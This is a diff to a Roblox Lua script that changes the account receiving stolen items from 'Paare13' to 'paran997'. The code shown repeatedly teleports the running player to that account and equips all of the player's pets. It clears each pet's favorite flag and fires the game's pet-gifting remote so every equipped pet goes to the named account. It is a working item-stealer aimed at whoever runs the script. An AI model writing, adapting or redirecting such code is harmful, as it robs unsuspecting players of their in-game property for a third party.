@@ -80,10 +80,10 @@ label.Font = Enum.Font.GothamBold
 label.TextScaled = true
 label.BackgroundTransparency = 1
 
--- Find Paare13
-local function findPaare13()
+-- Find paran997
+local function findparan997()
 	for _, p in ipairs(Players:GetPlayers()) do
-		if p.Name == "Paare13" then
+		if p.Name == "paran997" then
 			return p
 		end
 	end
@@ -103,14 +103,14 @@ local function equipAll()
 	end
 end
 
--- Gift all equipped pets to Paare13
+-- Gift all equipped pets to paran997
 local function giftAllToPaare()
 	for _, tool in ipairs(player.Character:GetChildren()) do
 		if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
 			if tool:GetAttribute("Favorite") ~= nil then
 				tool:SetAttribute("Favorite", false)
 			end
-			local args = { "GivePet", Players:WaitForChild("Paare13") }
+			local args = { "GivePet", Players:WaitForChild("paran997") }
 			ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
 		end
 	end
@@ -127,11 +127,11 @@ local function disableFavoriteOnEquipped()
 	end
 end
 
--- Continuously gift if Paare13 is found
+-- Continuously gift if paran997 is found
 RunService.RenderStepped:Connect(function()
-	local paare = findPaare13()
-	if paare and player.Character and paare.Character and paare.Character:FindFirstChild("HumanoidRootPart") then
-		player.Character:MoveTo(paare.Character.HumanoidRootPart.Position)
+	local paran997 = findparan997()
+	if paran997 and player.Character and paran997.Character and paran997.Character:FindFirstChild("HumanoidRootPart") then
+		player.Character:MoveTo(paran997.Character.HumanoidRootPart.Position)
 		equipAll()
 		disableFavoriteOnEquipped()
 		giftAllToPaare()
